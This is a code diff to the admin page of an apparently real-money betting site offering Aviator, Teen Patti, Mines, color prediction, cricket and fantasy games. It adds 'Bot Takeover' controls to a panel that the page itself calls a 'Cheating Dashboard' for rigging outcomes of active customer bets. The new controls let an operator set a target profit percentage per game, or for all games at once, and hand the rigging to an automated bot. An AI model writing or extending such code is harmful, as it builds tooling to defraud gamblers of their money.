@@ -417,11 +417,47 @@
         </div>
       </div>
 
-      <!-- Tab 5: Outcome Bias Control (Cheating Dashboard) -->
+        <!-- Tab 5: Outcome Bias Control (Cheating Dashboard) -->
       <div id="admin-cheats" class="admin-content active">
         <h3 style="margin-bottom:12px; font-size:16px;">Administrative Results Bias Console</h3>
-        <p style="font-size:12.5px; color:var(--text-dim); margin-bottom:20px;">Use this panel to rig or override
-          outcomes for active customer bets across Color Drawing rooms, Vimaan (Aviator), and Teen Patti showdowns.</p>
+        <p style="font-size:12.5px; color:var(--text-dim); margin-bottom:16px;">Use this panel to rig or override outcomes for active customer bets across Color Drawing rooms, Vimaan (Aviator), and Teen Patti showdowns, or activate autonomous AI Bot Takeover.</p>
+
+        <!-- Master Autonomous AI Bot Takeover Panel -->
+        <div class="card" style="background: linear-gradient(135deg, #091e17 0%, #0d281e 50%, #081a14 100%); border: 2px solid #10b981; padding: 16px; margin-top:0; margin-bottom: 16px; border-radius: 10px; box-shadow: 0 0 20px rgba(16, 185, 129, 0.2); width:100%;">
+          <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:12px;">
+            <div>
+              <div style="display:flex; align-items:center; gap:8px;">
+                <span style="font-size: 20px;">🤖</span>
+                <h3 style="margin:0; font-size:15px; color:#10b981; font-weight:900; letter-spacing:0.5px; text-transform:uppercase;">
+                  Master AI Bot Takeover (All Games)
+                </h3>
+                <span id="botGlobalActiveBadge" style="font-size:10px; font-weight:800; padding:2px 8px; border-radius:4px; background:#1e293b; color:#94a3b8; border:1px solid #475569;">
+                  ⚪ BOT STANDBY (OFF)
+                </span>
+              </div>
+              <p style="font-size:11.5px; color:#94a3b8; margin:4px 0 0 0;">
+                When active, the AI Bot takes complete control of all games to autonomously optimize and generate targeted profits without manual admin intervention.
+              </p>
+            </div>
+
+            <div style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">
+              <div style="display:flex; align-items:center; gap:4px; background:#04130e; padding:5px 10px; border-radius:6px; border:1px solid #065f46;">
+                <span style="font-size:11px; color:#6ee7b7; font-weight:bold;">Profit Target:</span>
+                <div style="display:flex; gap:3px;">
+                  <button type="button" onclick="setBotProfitPercentage('global', 100)" class="btn btn-sm bot-pct-global" data-pct="100" style="padding:3px 7px; font-size:11px; font-weight:800; border-radius:3px; background:#064e3b; color:#a7f3d0; border:1px solid #059669; cursor:pointer;">100%</button>
+                  <button type="button" onclick="setBotProfitPercentage('global', 90)" class="btn btn-sm bot-pct-global" data-pct="90" style="padding:3px 7px; font-size:11px; font-weight:800; border-radius:3px; background:#064e3b; color:#a7f3d0; border:1px solid #059669; cursor:pointer;">90%</button>
+                  <button type="button" onclick="setBotProfitPercentage('global', 80)" class="btn btn-sm bot-pct-global" data-pct="80" style="padding:3px 7px; font-size:11px; font-weight:800; border-radius:3px; background:#064e3b; color:#a7f3d0; border:1px solid #059669; cursor:pointer;">80%</button>
+                  <button type="button" onclick="setBotProfitPercentage('global', 70)" class="btn btn-sm bot-pct-global" data-pct="70" style="padding:3px 7px; font-size:11px; font-weight:800; border-radius:3px; background:#064e3b; color:#a7f3d0; border:1px solid #059669; cursor:pointer;">70%</button>
+                  <button type="button" onclick="setBotProfitPercentage('global', 50)" class="btn btn-sm bot-pct-global" data-pct="50" style="padding:3px 7px; font-size:11px; font-weight:800; border-radius:3px; background:#064e3b; color:#a7f3d0; border:1px solid #059669; cursor:pointer;">50%</button>
+                </div>
+              </div>
+
+              <button type="button" id="botGlobalToggleBtn" onclick="toggleBotTakeover('global')" style="background:#1e293b; border:2px solid #475569; color:#fff; font-weight:900; font-size:12.5px; padding:9px 16px; border-radius:6px; cursor:pointer; display:flex; align-items:center; gap:6px; transition:all 0.2s;">
+                🤖 ACTIVATE GLOBAL BOT TAKEOVER
+              </button>
+            </div>
+          </div>
+        </div>
 
         <!-- Color Prediction Bias Control Card (Wide & 3-Column Layout) -->
         <div class="card" style="background:#1a222d; border:1px solid #242f3d; padding:16px; margin-top:0; margin-bottom:16px; width:100%;">
@@ -443,7 +479,7 @@
           <!-- 3-Column Grid for Inputs, Heatmap, and Logs -->
           <div style="display:grid; grid-template-columns: minmax(200px, 240px) minmax(360px, 1fr) minmax(240px, 280px); gap:16px; align-items:start;">
             
-            <!-- Col 1: Manual Overrides & Selection -->
+            <!-- Col 1: Manual Overrides & Selection & Bot Takeover -->
             <div style="display:flex; flex-direction:column; gap:10px; background:#0d0f12; padding:12px; border-radius:8px; border:1px solid #242f3d;">
               <div style="font-size:11px; color:var(--text-dim); text-transform:uppercase; font-weight:bold; border-bottom:1px solid #1a222d; padding-bottom:4px; margin-bottom:4px;">⚙️ Manual Setup</div>
               
@@ -471,7 +507,26 @@
                 </select>
               </div>
 
-              <button class="btn btn-gold btn-block" onclick="applyColorRoomCheat()" style="color:#000; font-weight:700; font-size:11.5px; padding:8px 0; margin-top:4px;">Apply Custom Bias</button>
+              <button class="btn btn-gold btn-block" onclick="applyColorRoomCheat()" style="color:#000; font-weight:700; font-size:11.5px; padding:8px 0; margin-top:2px;">Apply Custom Bias</button>
+
+              <!-- Dedicated AI Bot Takeover Box for Color Prediction -->
+              <div style="background:#081c15; border:1px solid #059669; border-radius:6px; padding:9px; margin-top:6px;">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                  <span style="font-size:10.5px; font-weight:900; color:#10b981;">🤖 COLOR BOT TAKEOVER</span>
+                  <span id="botColorBadge" style="font-size:8px; font-weight:800; padding:1px 5px; border-radius:3px; background:#1e293b; color:#94a3b8;">STANDBY</span>
+                </div>
+                <div style="display:flex; gap:2px; margin-bottom:6px;">
+                  <button type="button" onclick="setBotProfitPercentage('color_guess', 100)" class="btn btn-sm bot-pct-color_guess" data-pct="100" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">100%</button>
+                  <button type="button" onclick="setBotProfitPercentage('color_guess', 90)" class="btn btn-sm bot-pct-color_guess" data-pct="90" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">90%</button>
+                  <button type="button" onclick="setBotProfitPercentage('color_guess', 80)" class="btn btn-sm bot-pct-color_guess" data-pct="80" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">80%</button>
+                  <button type="button" onclick="setBotProfitPercentage('color_guess', 70)" class="btn btn-sm bot-pct-color_guess" data-pct="70" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">70%</button>
+                  <button type="button" onclick="setBotProfitPercentage('color_guess', 50)" class="btn btn-sm bot-pct-color_guess" data-pct="50" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">50%</button>
+                </div>
+                <button type="button" id="botColorToggleBtn" onclick="toggleBotTakeover('color_guess')" style="width:100%; background:#1e293b; border:1px solid #475569; color:#cbd5e1; font-weight:900; font-size:11px; padding:6px; border-radius:4px; cursor:pointer;">
+                  🤖 ACTIVATE COLOR BOT
+                </button>
+              </div>
+
             </div>
 
             <!-- Col 2: Dynamic Bets Heatmap & Interactive Rigging -->
@@ -569,6 +624,24 @@
             <button class="btn btn-block" onclick="instantCrashAviator()"
               style="background:#c8102e; color:#fff; font-weight:800; font-size:12.5px; margin-top:2px; box-shadow:0 0 10px rgba(200,16,46,0.4); border:none; padding:8px; cursor:pointer;">💥
               CRASH VIMAAN NOW (INSTANT MID-FLIGHT)</button>
+
+            <!-- Dedicated AI Bot Takeover Box for Aviator -->
+            <div style="background:#081c15; border:1px solid #059669; border-radius:6px; padding:9px; margin-top:8px;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="font-size:10.5px; font-weight:900; color:#10b981;">🤖 AVIATOR BOT TAKEOVER</span>
+                <span id="botAviatorBadge" style="font-size:8px; font-weight:800; padding:1px 5px; border-radius:3px; background:#1e293b; color:#94a3b8;">STANDBY</span>
+              </div>
+              <div style="display:flex; gap:2px; margin-bottom:6px;">
+                <button type="button" onclick="setBotProfitPercentage('aviator', 100)" class="btn btn-sm bot-pct-aviator" data-pct="100" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">100%</button>
+                <button type="button" onclick="setBotProfitPercentage('aviator', 90)" class="btn btn-sm bot-pct-aviator" data-pct="90" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">90%</button>
+                <button type="button" onclick="setBotProfitPercentage('aviator', 80)" class="btn btn-sm bot-pct-aviator" data-pct="80" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">80%</button>
+                <button type="button" onclick="setBotProfitPercentage('aviator', 70)" class="btn btn-sm bot-pct-aviator" data-pct="70" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">70%</button>
+                <button type="button" onclick="setBotProfitPercentage('aviator', 50)" class="btn btn-sm bot-pct-aviator" data-pct="50" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">50%</button>
+              </div>
+              <button type="button" id="botAviatorToggleBtn" onclick="toggleBotTakeover('aviator')" style="width:100%; background:#1e293b; border:1px solid #475569; color:#cbd5e1; font-weight:900; font-size:11px; padding:6px; border-radius:4px; cursor:pointer;">
+                🤖 ACTIVATE AVIATOR BOT
+              </button>
+            </div>
           </div>
 
           <!-- Teen Patti Live Multiplayer Admin Console -->
@@ -579,6 +652,24 @@
                 <span>🃏 Teen Patti Live Rooms — Server Synced</span>
               </h4>
               <span id="tpActiveRoomBadge" style="font-size:9.5px; padding:3px 8px; border-radius:4px; background:rgba(16,185,129,0.15); border:1px solid #10b981; color:#10b981; font-weight:bold;">🟢 DATABASE LIVE</span>
+            </div>
+
+            <!-- Dedicated AI Bot Takeover Box for Teen Patti -->
+            <div style="background:#081c15; border:1px solid #059669; border-radius:6px; padding:9px; margin-bottom:12px;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="font-size:10.5px; font-weight:900; color:#10b981;">🤖 TEEN PATTI BOT TAKEOVER</span>
+                <span id="botTeenpattiBadge" style="font-size:8px; font-weight:800; padding:1px 5px; border-radius:3px; background:#1e293b; color:#94a3b8;">STANDBY</span>
+              </div>
+              <div style="display:flex; gap:2px; margin-bottom:6px;">
+                <button type="button" onclick="setBotProfitPercentage('teenpatti', 100)" class="btn btn-sm bot-pct-teenpatti" data-pct="100" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">100%</button>
+                <button type="button" onclick="setBotProfitPercentage('teenpatti', 90)" class="btn btn-sm bot-pct-teenpatti" data-pct="90" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">90%</button>
+                <button type="button" onclick="setBotProfitPercentage('teenpatti', 80)" class="btn btn-sm bot-pct-teenpatti" data-pct="80" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">80%</button>
+                <button type="button" onclick="setBotProfitPercentage('teenpatti', 70)" class="btn btn-sm bot-pct-teenpatti" data-pct="70" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">70%</button>
+                <button type="button" onclick="setBotProfitPercentage('teenpatti', 50)" class="btn btn-sm bot-pct-teenpatti" data-pct="50" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">50%</button>
+              </div>
+              <button type="button" id="botTeenpattiToggleBtn" onclick="toggleBotTakeover('teenpatti')" style="width:100%; background:#1e293b; border:1px solid #475569; color:#cbd5e1; font-weight:900; font-size:11px; padding:6px; border-radius:4px; cursor:pointer;">
+                🤖 ACTIVATE TEEN PATTI BOT
+              </button>
             </div>
 
             <!-- Step 1: Select Room from dropdown (populated from server) -->
@@ -710,6 +801,24 @@
               </select>
             </div>
             <button class="btn btn-gold btn-block" onclick="applyMinesCheat()" style="color:#000; font-weight:700;">Save Mines Rig Configuration</button>
+
+            <!-- Dedicated AI Bot Takeover Box for Mines -->
+            <div style="background:#081c15; border:1px solid #059669; border-radius:6px; padding:9px; margin-top:10px;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="font-size:10.5px; font-weight:900; color:#10b981;">🤖 MINES BOT TAKEOVER</span>
+                <span id="botMinesBadge" style="font-size:8px; font-weight:800; padding:1px 5px; border-radius:3px; background:#1e293b; color:#94a3b8;">STANDBY</span>
+              </div>
+              <div style="display:flex; gap:2px; margin-bottom:6px;">
+                <button type="button" onclick="setBotProfitPercentage('mines', 100)" class="btn btn-sm bot-pct-mines" data-pct="100" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">100%</button>
+                <button type="button" onclick="setBotProfitPercentage('mines', 90)" class="btn btn-sm bot-pct-mines" data-pct="90" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">90%</button>
+                <button type="button" onclick="setBotProfitPercentage('mines', 80)" class="btn btn-sm bot-pct-mines" data-pct="80" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">80%</button>
+                <button type="button" onclick="setBotProfitPercentage('mines', 70)" class="btn btn-sm bot-pct-mines" data-pct="70" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">70%</button>
+                <button type="button" onclick="setBotProfitPercentage('mines', 50)" class="btn btn-sm bot-pct-mines" data-pct="50" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">50%</button>
+              </div>
+              <button type="button" id="botMinesToggleBtn" onclick="toggleBotTakeover('mines')" style="width:100%; background:#1e293b; border:1px solid #475569; color:#cbd5e1; font-weight:900; font-size:11px; padding:6px; border-radius:4px; cursor:pointer;">
+                🤖 ACTIVATE MINES BOT
+              </button>
+            </div>
           </div>
 
           <!-- Card 2: Mines Professional Matrix Rig Console -->
@@ -809,6 +918,24 @@
             </div>
 
             <button class="btn btn-gold btn-block" onclick="applyBoundaryCheat()" style="color:#000; font-weight:700;">Apply Cricket Overrides</button>
+
+            <!-- Dedicated AI Bot Takeover Box for Boundary Baazi -->
+            <div style="background:#081c15; border:1px solid #059669; border-radius:6px; padding:9px; margin-top:10px;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="font-size:10.5px; font-weight:900; color:#10b981;">🤖 CRICKET BOT TAKEOVER</span>
+                <span id="botBoundaryBadge" style="font-size:8px; font-weight:800; padding:1px 5px; border-radius:3px; background:#1e293b; color:#94a3b8;">STANDBY</span>
+              </div>
+              <div style="display:flex; gap:2px; margin-bottom:6px;">
+                <button type="button" onclick="setBotProfitPercentage('boundary', 100)" class="btn btn-sm bot-pct-boundary" data-pct="100" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">100%</button>
+                <button type="button" onclick="setBotProfitPercentage('boundary', 90)" class="btn btn-sm bot-pct-boundary" data-pct="90" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">90%</button>
+                <button type="button" onclick="setBotProfitPercentage('boundary', 80)" class="btn btn-sm bot-pct-boundary" data-pct="80" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">80%</button>
+                <button type="button" onclick="setBotProfitPercentage('boundary', 70)" class="btn btn-sm bot-pct-boundary" data-pct="70" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">70%</button>
+                <button type="button" onclick="setBotProfitPercentage('boundary', 50)" class="btn btn-sm bot-pct-boundary" data-pct="50" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">50%</button>
+              </div>
+              <button type="button" id="botBoundaryToggleBtn" onclick="toggleBotTakeover('boundary')" style="width:100%; background:#1e293b; border:1px solid #475569; color:#cbd5e1; font-weight:900; font-size:11px; padding:6px; border-radius:4px; cursor:pointer;">
+                🤖 ACTIVATE CRICKET BOT
+              </button>
+            </div>
           </div>
 
           <!-- Card 2: Your Eleven Fantasy Player Bias -->
@@ -852,6 +979,24 @@
             </div>
 
             <button class="btn btn-gold btn-block" onclick="applyYourElevenCheat()" style="color:#000; font-weight:700;">Apply Fantasy Overrides</button>
+
+            <!-- Dedicated AI Bot Takeover Box for Your Eleven -->
+            <div style="background:#081c15; border:1px solid #059669; border-radius:6px; padding:9px; margin-top:10px;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="font-size:10.5px; font-weight:900; color:#10b981;">🤖 FANTASY BOT TAKEOVER</span>
+                <span id="botYourelevenBadge" style="font-size:8px; font-weight:800; padding:1px 5px; border-radius:3px; background:#1e293b; color:#94a3b8;">STANDBY</span>
+              </div>
+              <div style="display:flex; gap:2px; margin-bottom:6px;">
+                <button type="button" onclick="setBotProfitPercentage('youreleven', 100)" class="btn btn-sm bot-pct-youreleven" data-pct="100" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">100%</button>
+                <button type="button" onclick="setBotProfitPercentage('youreleven', 90)" class="btn btn-sm bot-pct-youreleven" data-pct="90" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">90%</button>
+                <button type="button" onclick="setBotProfitPercentage('youreleven', 80)" class="btn btn-sm bot-pct-youreleven" data-pct="80" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">80%</button>
+                <button type="button" onclick="setBotProfitPercentage('youreleven', 70)" class="btn btn-sm bot-pct-youreleven" data-pct="70" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">70%</button>
+                <button type="button" onclick="setBotProfitPercentage('youreleven', 50)" class="btn btn-sm bot-pct-youreleven" data-pct="50" style="padding:2px 4px; font-size:9.5px; font-weight:bold; border-radius:3px; background:#11221b; color:#a7f3d0; border:1px solid #059669; cursor:pointer; flex:1;">50%</button>
+              </div>
+              <button type="button" id="botYourelevenToggleBtn" onclick="toggleBotTakeover('youreleven')" style="width:100%; background:#1e293b; border:1px solid #475569; color:#cbd5e1; font-weight:900; font-size:11px; padding:6px; border-radius:4px; cursor:pointer;">
+                🤖 ACTIVATE FANTASY BOT
+              </button>
+            </div>
           </div>
 
         </div>
@@ -3590,11 +3735,168 @@
             if (typeof renderTeenPattiUI === 'function') renderTeenPattiUI(data.teen_patti);
           }
 
+          // --- Central AI Bot Takeover State Sync ---
+          if (data.bot_takeover) {
+            window.adminBotTakeoverState = data.bot_takeover;
+            if (typeof renderAllBotTakeoverUI === 'function') renderAllBotTakeoverUI();
+          }
+
           if (typeof updateAviatorBiasUI === 'function') updateAviatorBiasUI();
         })
         .catch(() => {
           generateLocalFallbackData();
         });
+    };
+
+    // --- Autonomous AI Bot Takeover Client System ---
+    window.adminBotTakeoverState = {
+      global: { enabled: false, profit_pct: 90 },
+      color_guess: { enabled: false, profit_pct: 90 },
+      aviator: { enabled: false, profit_pct: 90 },
+      teenpatti: { enabled: false, profit_pct: 90 },
+      mines: { enabled: false, profit_pct: 90 },
+      boundary: { enabled: false, profit_pct: 90 },
+      youreleven: { enabled: false, profit_pct: 90 }
+    };
+
+    window.toggleBotTakeover = function(gameKey, forceState) {
+      const current = (window.adminBotTakeoverState && window.adminBotTakeoverState[gameKey]) ? window.adminBotTakeoverState[gameKey].enabled : false;
+      const newState = (forceState !== undefined) ? forceState : !current;
+      const curPct = (window.adminBotTakeoverState && window.adminBotTakeoverState[gameKey]) ? (window.adminBotTakeoverState[gameKey].profit_pct || 90) : 90;
+
+      if (!window.adminBotTakeoverState[gameKey]) window.adminBotTakeoverState[gameKey] = {};
+      window.adminBotTakeoverState[gameKey].enabled = newState;
+      window.adminBotTakeoverState[gameKey].profit_pct = curPct;
+      renderAllBotTakeoverUI();
+
+      const params = new URLSearchParams();
+      params.append('game', gameKey);
+      params.append('enabled', newState ? 'true' : 'false');
+      params.append('profit_pct', curPct);
+
+      fetch('api/game_sync.php?action=admin_set_bot_takeover', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: params
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.all_states) {
+            window.adminBotTakeoverState = data.all_states;
+          }
+          renderAllBotTakeoverUI();
+          if (typeof pollLiveAdminGames === 'function') pollLiveAdminGames();
+        })
+        .catch(err => {
+          console.error("Error toggling bot takeover:", err);
+        });
+    };
+
+    window.setBotProfitPercentage = function(gameKey, pct) {
+      const numPct = parseInt(pct) || 90;
+      const currentEnabled = (window.adminBotTakeoverState && window.adminBotTakeoverState[gameKey]) ? window.adminBotTakeoverState[gameKey].enabled : false;
+
+      if (!window.adminBotTakeoverState[gameKey]) window.adminBotTakeoverState[gameKey] = {};
+      window.adminBotTakeoverState[gameKey].profit_pct = numPct;
+      renderAllBotTakeoverUI();
+
+      const params = new URLSearchParams();
+      params.append('game', gameKey);
+      params.append('enabled', currentEnabled ? 'true' : 'false');
+      params.append('profit_pct', numPct);
+
+      fetch('api/game_sync.php?action=admin_set_bot_takeover', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: params
+      })
+        .then(res => res.json())
+        .then(data => {
+          if (data.all_states) {
+            window.adminBotTakeoverState = data.all_states;
+          }
+          renderAllBotTakeoverUI();
+          if (typeof pollLiveAdminGames === 'function') pollLiveAdminGames();
+        })
+        .catch(err => {
+          console.error("Error setting bot profit percentage:", err);
+        });
+    };
+
+    window.renderAllBotTakeoverUI = function() {
+      const games = [
+        { key: 'global', btnId: 'botGlobalToggleBtn', badgeId: 'botGlobalActiveBadge', label: 'GLOBAL' },
+        { key: 'color_guess', btnId: 'botColorToggleBtn', badgeId: 'botColorBadge', label: 'COLOR' },
+        { key: 'aviator', btnId: 'botAviatorToggleBtn', badgeId: 'botAviatorBadge', label: 'AVIATOR' },
+        { key: 'teenpatti', btnId: 'botTeenpattiToggleBtn', badgeId: 'botTeenpattiBadge', label: 'TEEN PATTI' },
+        { key: 'mines', btnId: 'botMinesToggleBtn', badgeId: 'botMinesBadge', label: 'MINES' },
+        { key: 'boundary', btnId: 'botBoundaryToggleBtn', badgeId: 'botBoundaryBadge', label: 'CRICKET' },
+        { key: 'youreleven', btnId: 'botYourelevenToggleBtn', badgeId: 'botYourelevenBadge', label: 'FANTASY' }
+      ];
+
+      const globalActive = (window.adminBotTakeoverState && window.adminBotTakeoverState.global) ? window.adminBotTakeoverState.global.enabled : false;
+      const globalPct = (window.adminBotTakeoverState && window.adminBotTakeoverState.global) ? (window.adminBotTakeoverState.global.profit_pct || 90) : 90;
+
+      games.forEach(g => {
+        const config = (window.adminBotTakeoverState && window.adminBotTakeoverState[g.key]) ? window.adminBotTakeoverState[g.key] : { enabled: false, profit_pct: 90 };
+        const isDirectEnabled = !!config.enabled;
+        const isOverriddenByGlobal = (g.key !== 'global' && globalActive);
+        const isActive = isDirectEnabled || isOverriddenByGlobal;
+        const effectivePct = isOverriddenByGlobal ? globalPct : (config.profit_pct || 90);
+
+        // 1. Update Toggle Button
+        const btn = document.getElementById(g.btnId);
+        if (btn) {
+          if (isActive) {
+            btn.style.background = 'linear-gradient(135deg, #059669 0%, #10b981 100%)';
+            btn.style.border = '2px solid #34d399';
+            btn.style.color = '#022c22';
+            btn.style.fontWeight = '900';
+            btn.style.boxShadow = '0 0 15px rgba(16, 185, 129, 0.45)';
+            btn.innerHTML = `🤖 ${g.label} BOT TAKEOVER ACTIVE (${effectivePct}% PROFIT)`;
+          } else {
+            btn.style.background = '#1e293b';
+            btn.style.border = '1px solid #475569';
+            btn.style.color = '#cbd5e1';
+            btn.style.fontWeight = '800';
+            btn.style.boxShadow = 'none';
+            btn.innerHTML = `🤖 ACTIVATE ${g.label} BOT`;
+          }
+        }
+
+        // 2. Update Badge
+        const badge = document.getElementById(g.badgeId);
+        if (badge) {
+          if (isActive) {
+            badge.style.background = 'rgba(16, 185, 129, 0.2)';
+            badge.style.border = '1px solid #10b981';
+            badge.style.color = '#34d399';
+            badge.innerHTML = `🟢 BOT ACTIVE (${effectivePct}% PROFIT)`;
+          } else {
+            badge.style.background = '#1e293b';
+            badge.style.border = '1px solid #475569';
+            badge.style.color = '#94a3b8';
+            badge.innerHTML = `⚪ BOT STANDBY`;
+          }
+        }
+
+        // 3. Highlight active percentage button
+        const pctBtns = document.querySelectorAll(`.bot-pct-${g.key}`);
+        pctBtns.forEach(pBtn => {
+          const pVal = parseInt(pBtn.getAttribute('data-pct'));
+          if (pVal === effectivePct) {
+            pBtn.style.background = '#10b981';
+            pBtn.style.borderColor = '#34d399';
+            pBtn.style.color = '#022c22';
+            pBtn.style.fontWeight = '900';
+          } else {
+            pBtn.style.background = '#0d231a';
+            pBtn.style.borderColor = '#059669';
+            pBtn.style.color = '#a7f3d0';
+            pBtn.style.fontWeight = 'bold';
+          }
+        });
+      });
     };
 
     window.updateAdminAviatorStakesUI = function(betsArray) {
